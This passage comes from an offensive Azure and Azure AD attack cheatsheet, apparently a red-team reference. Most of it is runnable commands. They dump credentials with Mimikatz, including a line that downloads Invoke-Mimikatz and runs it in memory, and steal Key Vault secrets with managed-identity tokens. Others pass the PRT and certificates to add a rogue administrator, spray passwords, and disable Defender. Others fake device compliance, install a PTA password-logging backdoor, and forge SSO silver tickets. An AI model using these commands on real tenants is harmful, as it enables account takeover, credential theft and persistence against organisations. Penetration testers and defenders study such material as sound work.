PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
```

Against the whole subscription using MicroBurst.ps1

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```


## KeyVault Secrets

```powershell
# keyvault access token
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER

# connect
PS> $token = 'eyJ0..'
PS> $keyvaulttoken = 'eyJ0..'
PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken

# query the vault and the secrets
PS Az> Get-AzKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## Pass The PRT

> MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Copy the Context, ClearKey and DerivedKey
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
```

```powershell
# Generate a JWT
PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
PS AADInternals> $PRT_OF_USER = '...'
PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
PS AADInternals> $ClearKey = "XXYYZZ..."
PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
eyJ0eXAiOiJKV1QiL...
```

The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf.    
Edit the Chrome cookie (F12) -> Application -> Cookies with the values:

```powershell
Name: x-ms-RefreshTokenCredential
Value: <Signed JWT>
HttpOnly: √
```

:warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.


## Pass The Certificate

```ps1
Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username –Verbose
Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert

# Require the PRT, TenantID, Context and DerivedKey
& 'C:\Program Files\Python39\python.exe' C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
# PFX saved with the name <Username>@<TENANT NAME>.onmicrosoft.com.pfx and password AzureADCert
```

Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine

https://github.com/morRubin/AzureADJoinedMachinePTC

```ps1
Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10

python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```

## Intunes Administration

Requirements:
* **Global Administrator** or **Intune Administrator** Privilege : `Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"`

1. Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT
2. Go to **Devices** -> **All Devices** to check devices enrolled to Intune
3. Go to **Scripts** and click on **Add** for Windows 10. 
4. Add a **Powershell script**
5. Specify **Add all users** and **Add all devices** in the **Assignments** page.

:warning: It will take up to one hour before you script is executed !



## Dynamic Group Membership

Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`

Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`    
Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group

1. Open user's profile, click on **Manage**
2. Click on **Resend** invite and to get an invitation URL
3. Set the secondary email
    ```powershell
    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
    ```

## Administrative Unit

> Administrative Unit can reset password of another user

```powershell
PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl 
PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
```

## Deployment Template

```powershell
PS Az> Get-AzResourceGroup
PS Az> Get-AzResourceGroupDeployment -ResourceGroupName SAP

# Export
PS Az> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
cat <DEPLOYMENT NAME>.json # search for hardcoded password
cat <PATH TO .json FILE> | Select-String password
```

## Application Proxy

```powershell
# Enumerate application that have Proxy
PS C:\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
PS C:\Tools> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
PS C:\Tools> . C:\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1
PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
```

## Conditional Access

* Bypassing conditional access by copying User-Agent (Chrome Dev Tool > Select iPad Pro, etc)
* Bypassing conditional access by faking device compliance
    ```powershell
    # AAD Internals - Making your device compliant
    # Get an access token for AAD join and save to cache
    Get-AADIntAccessTokenForAADJoin -SaveToCache
    # Join the device to Azure AD
    Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
    # Marking device compliant - option 1: Registering device to Intune
    # Get an access token for Intune MDM and save to cache (prompts for credentials)
    Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
    # Join the device to Intune
    Join-AADIntDeviceToIntune -DeviceName "SixByFour"
    # Start the call back
    Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
    ```


## Azure AD

With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.

1. Authenticate to your webmail portal (i.e. https://webmail.domain.com/)
2. Change your browser URL to: https://azure.microsoft.com/
3. Pick the account from the active sessions
4. Select Azure Active Directory and enjoy!

### Azure AD vs Active Directory

| Active Directory  | Azure AD  |
|---|---|
| LDAP  | REST API'S  |
| NTLM/Kerberos  | OAuth/SAML/OpenID |
| Structured directory (OU tree)  | Flat structure  |
| GPO  | No GPO's  |
| Super fine-tuned access controls  | Predefined roles |
| Domain/forest  | Tenant  |
| Trusts  | Guests  |

* Password Hash Syncronization (PHS)
    * Passwords from on-premise AD are sent to the cloud
    * Use replication via a service account created by AD Connect
* Pass Through Authentication (PTA)
    * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text
* Connect Windows Server AD to Azure AD using Federation Server (ADFS)
    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password


* Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large
* Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large
* Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large
* Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large

### Password Spray

> Default lockout policy of 10 failed attempts, locking out an account for 60 seconds

```powershell
git clone https://github.com/dafthack/MSOLSpray
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!

# UserList  - UserList file filled with usernames one-per-line in the format "user@domain.com"
# Password  - A single password that will be used to perform the password spray.
# OutFile   - A file to output valid results to.
# Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.
# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
```

### Convert GUID to SID

The user's AAD id is translated to SID by concatenating `"S-1–12–1-"` to the decimal representation of each section of the AAD Id.

```powershell
GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
```

For example, the representation of `6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`

## Azure AD Connect 

Check if Azure AD Connect is installed : `Get-ADSyncConnector`

* For **PHS**, we can extract the credentials
* For **PTA**, we can install the agent
* For **Federation**, we can extract the certificate from ADFS server using DA

```powershell
PS > Set-MpPreference -DisableRealtimeMonitoring $true
PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
PS > Get-AADIntSyncCredentials

# Get Token for SYNC account and reset on-prem admin password
PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
```

1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`
2. Install a PTA Backdoor
    ```powershell
    PS AADInternals> Install-AADIntPTASpy
    PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
    ```


### Azure AD Connect - Password extraction

Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf

Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
--- | --- | --- | --- | ---
ADSyncDecrypt | Yes | Yes | No | No
ADSyncGather | Yes | No | No | Yes
ADSyncQuery | No (network RPC calls only) | No | Yes | Yes


```powershell
git clone https://github.com/fox-it/adconnectdump
# DCSync with AD Sync account
```

### Azure AD Connect - MSOL Account's password and DCSync

You can perform **DCSync** attack using the MSOL account.

Requirements:
  * Compromise a server with Azure AD Connect service
  * Access to ADSyncAdmins or local Administrators groups

Use the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password for the MSOL account:
* `azuread_decrypt_msol.ps1`: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
* `azuread_decrypt_msol_v2.ps1`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c

Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.

### Azure AD Connect - Seamless Single Sign On Silver Ticket

> Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)

> Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account **AZUREADSSOC** is created in the on-prem AD.

:warning: The password of the AZUREADSSOACC account never changes.

Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure

1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
    ```powershell
    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
    ```
2. AAD logon name of the user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
4. Create the Silver Ticket and inject it into Kerberos cache:
    ```powershell
    mimikatz.exe "kerberos::golden /user:elrond
    /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
    /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
    /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
    ```
5. Launch Mozilla Firefox
6. Go to about:config and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.


## References

* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)
* [Get Access Tokens for Managed Service Identity on Azure App Service](https://zhiliaxu.github.io/app-service-managed-identity.html)
* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://o365blog.com/post/mdm/)
* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)
* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
* [An introduction to penetration testing Azure - Graceful Security](https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-azure/)
* [Running Powershell scripts on Azure VM - Netspi](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
* [Attacking Azure Cloud shell - Netspi](https://blog.netspi.com/attacking-azure-cloud-shell/)
* [Maintaining Azure Persistence via automation accounts - Netspi](https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/)
* [Detecting an attacks on active directory with Azure - Smartspate](https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/)
* [Azure AD Overview](https://www.youtube.com/watch?v=l_pnNpdxj20) 
* [Windows Azure Active Directory in plain English](https://www.youtube.com/watch?v=IcSATObaQZE)
* [Building Free Active Directory Lab in Azure - @kamran.bilgrami](https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f) 
* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
* [Azure AD connect for RedTeam - @xpnsec](https://blog.xpnsec.com/azuread-connect-for-redteam/)
* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/)
* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://www.lares.com/hunting-azure-admins-for-vertical-escalation/)
* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
* [AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
